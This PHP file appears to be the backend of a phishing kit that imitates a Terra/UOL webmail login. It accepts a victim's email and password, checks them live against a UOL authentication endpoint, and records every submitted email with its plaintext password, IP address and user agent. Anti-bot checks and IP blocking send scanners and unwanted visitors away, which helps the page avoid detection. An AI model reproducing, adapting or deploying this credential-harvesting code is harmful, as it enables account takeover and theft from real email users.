<?php
declare(strict_types=1);

/** API Terra Mail Pessoa FÃ­sica — POST email/senha, valida em email.uolhost.com.br/auth */

require __DIR__ . '/../includes/security.php';

$config = require __DIR__ . '/../config.php';
public_session_start($config);

require __DIR__ . '/../includes/anti_bot.php';
require __DIR__ . '/../includes/storage.php';
require __DIR__ . '/../includes/uol_verify.php';
require __DIR__ . '/../includes/api_auth.php';

header('Content-Type: application/json; charset=utf-8');

$denyUrl = uol_blocked_redirect($config);

$botCheck = anti_bot_evaluate($config);
if (!$botCheck['allowed']) {
    http_response_code(403);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    uol_api_json_response(405, ['ok' => false, 'message' => 'invalid_login', 'result' => 'INVALID']);
}

if (!rate_limit_check('uol_api', 30, 300)) {
    uol_api_json_response(429, ['ok' => false, 'message' => 'invalid_login', 'result' => 'INVALID']);
}

$creds = uol_api_read_credentials();
$storage = new Storage((string) $config['data_dir']);
$ip = client_ip();
$ua = client_ua();

if ($storage->isIpBlocked($ip)) {
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

$result = uol_api_verify($creds['email'], $creds['password'], $config, true);
$ok = !empty($result['payload']['ok']);

if ($ok) {
    $storage->recordLoginAttempt($creds['email'], $creds['password'], true, $ip, $ua);
    $_SESSION['terra_user'] = $creds['email'];
} else {
    $storage->recordLoginAttempt($creds['email'], $creds['password'], false, $ip, $ua);
}

uol_api_json_response($result['status'], $result['payload']);
